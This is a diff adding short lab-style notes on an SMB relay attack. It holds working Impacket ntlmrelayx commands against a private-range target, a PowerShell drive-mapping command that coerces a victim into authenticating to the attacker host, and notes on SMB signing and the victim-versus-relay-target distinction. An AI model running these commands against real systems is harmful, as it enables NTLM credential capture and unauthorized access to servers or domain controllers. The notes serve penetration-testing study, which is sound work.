@@ -1,0 +1,23 @@
+SMB Relay Attack
+
+Option A: Target single host
+ntlmrelayx.py -t smb://192.168.182.10 -smb2support --no-dump --no-acl --no-validate-privs --remove-mic -debug
+
+Option B: Target from file
+sudo python3 -m impacket.ntlmrelayx -tf targets.txt -smb2support
+
+•	targets.txt contains: 192.168.182.10
+On Windows victim:
+•	Trigger the relay manually via PowerShell:
+# One-time drive mapping (non-persistent)
+New-PSDrive -Name X -PSProvider FileSystem -Root "\\192.168.182.136\IPC$" -Persist:$false -ErrorAction SilentlyContinue
+
+Observation:
+•	NTLM credentials captured by attacker and relayed to the target.
+•	Note: Modern Windows systems with SMB signing enabled may block relay attacks; only capture-only attacks may succeed.
+ Important Notes 
+Do NOT run Responder and ntlmrelayx on the same interface simultaneously → port conflicts (SMB ports 445/139).
+1.	Victim vs Relay Target:
+o	Victim: machine tricked into authenticating → provides credentials.
+o	Relay Target: high-value machine attacker wants to access (server, DC).
+o	Usually, victim ≠ relay target.
